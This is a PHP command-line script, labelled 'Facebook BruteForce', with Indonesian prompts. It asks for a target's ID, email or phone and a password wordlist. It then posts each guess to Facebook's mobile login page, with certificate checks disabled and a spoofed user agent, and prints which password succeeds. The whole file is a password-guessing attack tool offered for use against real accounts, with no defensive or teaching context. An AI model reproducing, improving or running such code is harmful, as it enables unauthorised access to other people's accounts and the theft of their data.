<?php
error_reporting(0);
/*
  * Facebook BruteForce
  * 2 febuary 2019
*/
print "
      \e[0;34m<\e[0;31m+\e[0;34m> \e[0;32mFacebook Brute \e[0;34m<\e[0;31m+\e[0;34m>
      	\e[0;34m] \e[1;33mFast Brute \e[0;31m!
    \e[0;31m$\e[1;35m------------------------\e[0;31m$
\e[1;32m _____ ____                     \e[1;31m _
\e[1;32m|  ___| __ )  \e[1;31m___ _ __ __ _  ___| | __
\e[1;32m| |_  |  _ \ \e[1;31m/ __| '__/ _` |/ __| |/ /
\e[1;32m|  _| | |_) |\e[1;31m (__| | | (_| | (__|   <
\e[1;32m|_|   |____/\e[1;31m \___|_|  \__,_|\___|_|\_\
\n
";
function check($user, $pass) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
	$kuki = 'kuki.txt';
	touch($kuki);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $kuki);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $kuki);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
	$output = curl_exec($ch) or die('</> Not Found ! '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
$nc="\e[0m";
$white="\e[1;37m";
$black="\e[0;30m";
$blue="\e[0;34m";
$light_blue="\e[1;34m";
$green="\e[0;32m";
$light_green="\e[1;32m";
$cyan="\e[0;36m";
$light_cyan="\e[1;36m";
$red="\e[0;31m";
$light_red="\e[1;31m";
$purple="\e[0;35m";
$light_purple="\e[1;35m";
$brown="\e[0;33m";
$yellow="\e[1;33m";
$gray="\e[0;30m";
$light_gray="\e[0;37m";
$file = $_SERVER[argv][1];
echo"\e[0;34m[\e[0;31m+\e[0;34m] \e[0;32mMasukan ID Target : \e[1;36m";
$user = trim(fgets(STDIN));
echo"\e[0;34m[\e[0;31m+\e[0;34m] \e[0;32mWordlist Target : \e[1;36m";
$wordlist = trim(fgets(STDIN));
if(!empty($user) && !empty($wordlist)) {
	$passlist = file($wordlist);
	$passcount = count($passlist);
	print $banner;
	print "\e[0;34m[\e[0;31m+\e[0;34m] Checking Password : ".$light_cyan.$passcount."\n".$nc;
	foreach($passlist as $password) {
		$pass = substr($password, 0, strlen($password) - 1);
		if(check(urlencode($user), urlencode($pass))) {
			print "\e[1;33m[\e[0;32m+\e[1;33m] \e[0;32mPassword Benar \e[0;34m<\e[0;31m-\e[0;34m> : $pass.\n".$nc;
		} else {
			print "\e[1;33m[\e[0;32m+\e[1;33m] \e[0;31mPassword Tidak Cocok \e[0;34m<\e[0;31m-\e[0;34m> : $pass.\n".$nc;
		}
	}
} else {
	print "
\e[1;36musage \e[1;37mbrute.php
\e[0;34m[\e[0;31m!\e[0;34m] \e[0;32mAnda bisa masukan ID Target Atau email dan no hp";
}
?>
